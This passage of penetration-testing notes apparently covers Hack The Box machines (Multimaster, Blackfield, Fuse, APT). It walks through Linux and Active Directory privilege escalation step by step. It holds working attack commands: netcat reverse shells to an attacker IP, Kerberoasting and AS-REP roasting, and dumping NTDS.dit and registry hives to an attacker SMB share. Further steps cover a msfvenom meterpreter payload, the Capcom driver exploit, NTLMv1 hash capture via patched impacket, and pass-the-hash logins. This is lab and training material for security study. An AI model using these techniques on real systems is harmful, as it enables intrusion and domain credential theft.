		echo "Running backup script in the background, it might take a while..."
		/opt/scripts/backup.py &
	else
		echo "Insufficient privileges to perform the selected operation."
	fi
}
......
```

```python
# /opt/scripts/backup.py

#!/usr/bin/python3
from shutil import make_archive
src = '/var/www/html/'
# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
```

This combination of configurations inadvertently presents a privilege escalation opportunity. We can create a Python library that defines the make_archive function that the script is expecting, and attempt to hijack script execution. 

Save the contents below to `/dev/shm/shutil.py` .  

```python
import os

def make_archive(h, t, b):
    os.system('nc 10.10.x.x 8000 -e "/bin/bash"')
```

```shell
# it is necessary to pass PYTHONPATH variable directly to sudo
cd /dev/shm
sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh ...
```



## Active Directory

#### Machine Multimaster(10.10.10.179)

```powershell
evil-winrm -i 10.10.10.179 -u sbauer -p '...' # User sbauer is owned.
```

Use Bloodhound to enumerate and visualise the Active Directory domain, and identify possible attack chains that will allow us to elevate our domain privileges. The bloodhound-python ingestor can be used to **remotely** collect data from Active Directory. Or run `.\SharpHound.exe --CollectionMethod All` on the server to collect data.

```shell
sudo apt install bloodhound
sudo pip install bloodhound-python
bloodhound-python -c ALL -u sbauer -p '...' -d megacorp.local -ns
10.10.10.179

zip info.zip *.json
neo4j console
```

On the Search tab, input `SBAUER@MEGACORP.LOCAL` and mark this user as owned. Now clicking on the user icon > `Reachable High Value Targets` shows that ***this user has GenericWrite permission on `JORDEN@MEGACORP.LOCAL`*** . This user is considered high-value, owning to their membership of the highly privileged *Server Operators group*. 

Generic Write access grants the ability to write to any non-protected attribute on the target object, including members for a group, and serviceprincipalnames for a user. We can abuse this permission to disable Kerberos pre-authentication for the Jorden user.

*Assuming that Jorden has weak password set*, let's disable Kerberos pre-authentication for them using the `Get-ADUser` [AD Module](https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll) cmdlet.

```powershell
Get-ADUser -Filter 'Name -like "Jor*"' | Set-ADAccountControl -doesnotrequirepreauth $true
# or use powerview
Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose
```

Using Impacket's GetNPUser, we can attempt an **ASREPRoasting attack** in order to extract a hash from user accounts that do not require pre-authentication then use hashcat to brute force the password. 

```powershell
GetNPUsers.py MEGACORP.local/jorden -request
# result: $krb5asrep$23$jorden@MEGACORP.LOCAL:5a51c3c1d5627a6594b1f4...
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force
# now have jorden's pass
```

Or **Kerberoasting attack**:

```powershell
$SecPassword = ConvertTo-SecureString '...' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('MEGACORP.LOCAL\sbauer', $SecPassword)

Enter-PSSession -computername 10.10.10.179 -credential $Cred
import-module .\powerview.ps1
invoke-aclscanner | ?{$_.identityreferencename -like 'sbauer'}
# result: GenericWrite jorden
Set-DomainObject -Credential $Cred -Identity jorden -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
Invoke-Kerberoast | fl
# result: $krb5tgs$23$*...
# Get-DomainSPNTicket -Credential $Cred jorden | fl
# hashcat ......
```

The Server Operators group allows members to start, stop and change the properties of the browser (Computer Browser) service - and other services. We can use this privilege to modify the service binary path.  

```powershell
sc sdshow browser
sc stop browser
sc config browser binpath= "c:\windows\system32\cmd.exe /c c:\windows\system32\spool\drivers\color\nc.exe 10.10.x.x 4444 -e cmd.exe"
# sc config browser binpath= "c:\windows\system32\cmd.exe /c net user administrator password1" // psexec
sc start browser
```

Finally, we gain a shell as SYSTEM.

#### Machine Blackfield(10.10.10.192)

Run `whoami /priv` on the Win-Rm shell, it shows **SeBackupPrivilege and SeRestorePrivilege**. 

Retrieve files from the Administrator Desktop using robocopy. Using robocopy, we are able to retrieve a notes.txt but are denied access on root.txt.  

```powershell
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

By reading the notes.txt file, we understand the root.txt flag is encrypted (probably with EFS), which is blocking our access with robocopy.  

So we need to get into the Administrator context. On way to do this is to abuse SeBackup and
SeRestore privileges in order to dump the AD database. Then, we can use the administrator
NTLM hash in a PtH (Pass the Hash) attack to get a shell as them.  

```shell
# in kali
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support smb .
```

On the Win-Rm shell, we can backup the NTDS folder with wbadmin.  

```
echo "Y" | wbadmin start backup -backuptarget:\\10.10.x.x\smb -include:c:\windows\ntds
```

Next, retrieve the version of the backup.  We can now restore the NTDS.dit file, specifying the backup version.  

```
wbadmin get versions
echo "Y" | wbadmin start recovery -version:10/01/2020-14:23 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

We need to export the system hive too, and transfer both this and the NTDS.dit to our local machine.  Copy the files to our box via our mounted SMB drive.  Next, we can extract all the hashes in the domain using secretsdump.py.  

```powershell
reg save HKLM\SYSTEM C:\system.hive
cp ntds.dit \\10.10.x.x\smb\NTDS.dit
cp system.hive \\10.10.x.x\smb\system.hive

# in kali
secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
```

With the primary domain administrator hash, we can use wmiexec to get a shell (if we use psexec, the Administrator security context will not be preserved, and we will be NT AUTHORITY SYSTEM, which will not allow us to decrypt the file).  

```
wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
```

**Alternative way to dump hashes**
We start off by creating a file called cmd with the following content and place it in the C:\windows\temp\ folder .

```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% h:
exit
```

We then execute it using `diskshadow /s cmd` to create a shadow volume accessible via the H: drive .

In Evil-WinRM we upload SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll from the [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) GitHub repo, which will allow us to copy files from the newly exposed shadow copy (H:).  

```
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll
```

Next, import the .dll files and invoke the Copy-FileSeBackupPrivilege cmdlet on ntds.dit and system .  

```powershell
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll

Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -
Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
c:\windows\temp\SYSTEM -Overwrite
```

Download the saved files with Evil-WinRM. 

```
download system
download ntds
```

 Then run secretsdump, specifying the **LOCAL** parameter to extract the hashes from the NTDS.dit.  

```
secretsdump.py -ntds ntds -system system LOCAL
```

**If this wasn't a domain controller**, there would be **no NTDS.dit file** to get passwords from, so we would need to download the **SYSTEM, SAM and SECURITY** files instead:  

```powershell
Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
c:\windows\temp\SYSTEM -Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SECURITY
c:\windows\temp\SECURITY -Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SAM c:\windows\temp\SAM -Overwrite
```

From these files we can **extract LSA secrets, the machine account and local user hashes using secretsdump**.  

```
secretsdump.py -security security -sam sam -system system LOCAL
```

#### Machine Fuse(10.10.10.193)

Now we have svc-print user shell using evil-winrm.

The `whoami /groups` command reveals that we are a member of the Print Operators group.
Membership of this group bestows the **SeLoadDriverPrivilege** on its members. The command
`whoami /priv` reveals that this privilege is already enabled in our logon token. We can get a better understanding of the SeLoadDriver privilege by reading this post by Microsoft which describes the vulnerability and impact associated with this privilege:  

```
Device drivers run as highly privileged code. A user who has the Load and unload device drivers user right could unintentionally install malware that masquerades as a device driver.
```

So far we know that we have the ability to load drivers. However, a quick Google search of this exploitation vector reveals a Tarlogic Security [post](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) that shows how a vulnerable driver can be loaded, which can be leveraged to get RCE. It also mentions that this vector is **no longer exploitable in the latest Windows 10 or Windows 2016 versions.**  

```
All tests have been performed in a Windows 10 Version 1708 environment.
As of Windows 10 Version 1803, NTLoadDriver seems to forbid references to registry keys under HKEY_CURRENT_USER.
```

It also **isn't exploitable on Windows Server 2019**. However, referring back to our Nmap scan, we see that the machine is *Windows Server 2016, OS Build 14393*. *Privilege escalation using the SeLoadDriver privilege is still possible in this build version.*
Windows Defender is not enabled on the machine so we don't have to care about any evasion.  

```powershell
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
# Disable
```

We are going to load the same vulnerable driver as the blog post and use Metasploit to exploit it. 

The Metasploit Capcom exploit requires a modification before we can use it so let's open the exploit in an editor.  

```
pico /usr/share/metasploitframework/modules/exploits/windows/local/capcom_sys_exec.rb
```

Next, comment out the section beginning with check_result , using the multi-line comment tags =begin and =end . These tags should not be indented. 

```ruby
=begin
	check_result = check
	if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown
		fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
	end
	if sysinfo['Architecture'] == ARCH_X64
		if session.arch == ARCH_X86
			fail_with(Failure::NoTarget, 'Running against WOW64 is not supported,please get an x64 session')
		end
		if target.arch.first == ARCH_X86
			fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
		end
	end
=end
```

Next, start Metasploit and set up the multi/hander as follows.  

```shell
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit -j
```

Then create a 64-bit Meterpreter reverse TCP payload. The architecture is important because the vulnerable Capcom driver exploit is only possible in 64-bit sessions.  

```
msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > msiexec.exe
```

Now we stand up a Python web server in our virtual machine, download the binary to the server
and execute it using the start-process PowerShell cmdlet. After executing the binary, we
receive a Meterpreter session as expected.  

```
wget http://10.10.14.2/msiexec.exe -O msiexec.exe
start-process .\msiexec.exe
```

Next, we need to load the vulnerable Capcom driver, which can be exploited with the above module. Safe boot is not enabled in the VM BIOS, which allows us to load signed third-party drivers on the system.
In an attempt to defeat game-cheaters, Capcom attempted to build a Sony-style rootkit into their driver. However, the implementation was poor and it contained multiple vulnerabilities, including one that allowed userland code to be executed in the kernel.
We can download and compile [eoploaddriver.cpp](https://gist.github.com/cube0x0/235720d88444d59238a10b727c756305), and use it to install the vulnerable driver, but first we need to install Visual Studio then Build Tools for Visual Studio.
After installation we can launch a Visual Studio developer tools console (x86-x64) to compile the binary using the following command. The `/DUNICODE` flag will allow for Unicode output and we'll import the external `shell32.lib` library specified at the end of the command.  

```
cl.exe /DUNICODE /D_UNICODE eoploaddriver.cpp shell32.lib
```

The binary is successfully compiled. Next, download the NirSoft tool [DriverView](https://www.nirsoft.net/utils/driverview.zip) and the vulnerable Capcom [driver](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys?raw=true). Transfer the three files to the box under C:\test .  

```
wget http://10.10.14.2/eoploaddriver.exe -O C:\test\eoploaddriver.exe
wget http://10.10.14.2/Capcom.sys -O C:\test\Capcom.sys
wget http://10.10.14.2/DriverView.exe -O C:\test\DriverView.exe
```

First, execute eoploaddriver.exe , in order to load the vulnerable driver.  

```
.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\Capcom.sys
```

This runs and the status code 00000000 is returned, which indicates that the driver was successfully loaded. We can use DriverView.exe to confirm this.  

```powershell
\DriverView.exe /stext drivers.txt
gc .\drivers.txt | Select-String -pattern Capcom
```

Finally, return to Metasploit and run the exploit.  

```shell
use exploit/windows/local/capcom_sys_exec
set SESSION 1
LHOST tun0
run
```

This is successful, and we receive a shell as SYSTEM.  

#### Machine APT(10.10.10.213)

Now we have evil-winrm shell as henry.vinson_adm.

We run a local enumeration tool such as [Seatbelt](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Seatbelt.exe) in order to detect any security issues.  

We can bypass AMSI and then execute the binary using `Invoke-Binary` . One interesting result from the checks is that `LMCompatibilityLevel` is set to 2 . According to the [documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level), this is used to specify which protocols can be used for authentication by the client and server. The default value is set to 3 i.e. `Send NTLMv2 response only` which allows just NTLMv2.
The box is found to **allow NTLMv1 authentication, which is susceptible to cracking**. If we manage to steal NTLMv1 authentication hash then we can crack it using the online service [crack.sh](crack.sh) to obtain the NTLM hash and authenticate as the computer account.  

Tools such as [RoguePotato](https://github.com/antonioCoco/RoguePotato) can help us in forcing authentication as the SYSTEM account. However, we'll have to modify it to support IPv6 as IPv4 inbound is blocked. We clone the repository on a Windows host and then open it in Visual Studio.  

Browsing to `IStorageTrigger.cpp` will reveal the array used to store the remote IP address. This is set to 16 bytes by default for IPv4 addresses. We change the length to 48 to accommodate IPv6 addresses then  compile the binary and then copy it over to the Linux VM.  

```c++
HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void*
pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
    short sec_len = 8;
    char remote_ip_mb[48];
    wcstombs(remote_ip_mb, remote_ip, 48);
<SNIP>
}
```

Now we need **an RPC server to negotiate the incoming authentication and capture the hash**. This patch can assist in modifying impacket to be used as an RPC server. We need also to download an older impacket version in order to apply the patch.  

```shell
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz -O- | tar -xzv
cd impacket-0.9.21

wget https://gist.githubusercontent.com/Gilks/0fc75929faba704c05143b01f34c291b/raw/e1455b82d4a7ba23998151c28abc66f7e18a8e75/rpcrelayclientserver.patch
```

Before applying the patch we add the following addition at line 556 in `impacket/dcerpc/v5/rpcrt.py` .  

```
MSRPC_RTS = 0x14
```

Now we apply the patch using git.  

```
git apply --whitespace=fix --reject rpcrelayclientserver.patch
```

We make sure that all patches are applied without any errors. We need to modify a couple files to adjust to our needs. Edit `impacket/examples/ntlmrelayx/clients/__init__.py` to parse IPv6 addresses properly .

```python
class ProtocolClient:
    PLUGIN_NAME = 'PROTOCOL'
    def __init__(self, serverConfig, target, targetPort,extendedSecurity=True):
        if target.netloc.endswith(':445'):
            ip = target.netloc[:-4]
        else:
            ip = target.netloc
        self.serverConfig = serverConfig
        self.targetHost = ipq
        # A default target port is specified by the subclass
        self.targetPort = targetPort
        self.target = self.targetHost
        self.extendedSecurity = extendedSecurity
        self.session = None
        self.sessionData = {}
```

Next, we update the do_ntlm_negotiate function in `impacket/examples/ntlmrelayx/servers/rpcrelayserver.py` to the following.  

```python
def do_ntlm_negotiate(self, token):
    self.client = smbrelayclient.SMBRelayClient(self.server.config,self.target)
    if not self.client.initConnection():
        raise Exception("Client connection failed.")
    self.challengeMessage = self.client.sendNegotiate(token)
    self.challengeMessage['challenge'] = bytes.fromhex('1122334455667788')
    data = bytearray(self.challengeMessage.getData())
    data[22] = data[22] & NTLMSSP_Disable_ESS
    self.challengeMessage = bytes(data)
```

This is going to set the challenge to `1122334455667788` , which is a requirement for crack.sh .
We also need to print the response hash .

```python
elif messageType == NTLMSSP_AUTH_CHALLENGE_RESPONSE:
    authenticateMessage = ntlm.NTLMAuthChallengeResponse()
    authenticateMessage.fromString(token)
    
    ntlm_hash_data = outputToJohnFormat(bytes.fromhex('1122334455667788'), authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'])
    print(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'])
```

Finally, we need to create an RPC server to listen for connections.  

```python
#!/usr/bin/python3
import sys
import logging
from impacket.examples.ntlmrelayx.servers.rpcrelayserver import RPCRelayServer
from impacket.examples import logger
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

logging.getLogger().setLevel(logging.DEBUG)

c = NTLMRelayxConfig()
c.setEncoding(sys.getdefaultencoding())
c.setSMB2Support(True)
c.setListeningPort(135)
c.setInterfaceIp('')
c.setIPv6(True)

s = RPCRelayServer(c)
s.run()
```

Now we will install this patched impacket version in a virtual environment, so that we don't have to modify the actual installation.  

```shell
pipenv shell
python setup.py install
```

We run the RPC server and then execute the modified Rogue Potato on the box.  

```
.\roguepotato.exe -r dead:beef:2::1002 -e cmd
```

This should successfully negotiate authentication and return the NTLMv1 hash.  Use crack.sh and submit the hash in the format `NTHASH:<hash>` . We should receive an e-mail with the cracked hash soon.  

```
python rpcserver.py

APT$::HTB:95aca8...
```

This hash can be used to perform DCSync as it belongs to the DC computer account.  This will return the NTLM hash for the domain administrator's account. We finally can use it to login as the DA via WinRM.  

```shell
secretsdump.py 'htb.local/APT$@apt' -hashes :d167c3... -just-dc-user administrator

evil-winrm -u administrator -i apt -H c370bd...
```

**Alternate method**

It's also possible to force authentication from services running as the SYSTEM account. One such service is the Windows Defender. The defender cli `MpCmdRun` allows scanning files on demand by any user. We can use it to request a share hosted on our box and capture authentication.
First we need to edit `Responder.conf` and set the challenge to `1122334455667788` . Then start Responder to listen for incoming connections.  

```shell
./Responder.py -I tun0 --lm
```

The --lm flag forces protocol downgrade to capture NTLMv1 hashes. Switch to the WinRM shell and issue the command below:  

```powershell
& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2102.4-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.x.x\share\file.txt
```

This requests defender to start a scan with scan type set to 3 i.e. scan the specified file.  Responder shows the NTLMv1 hash is received .





























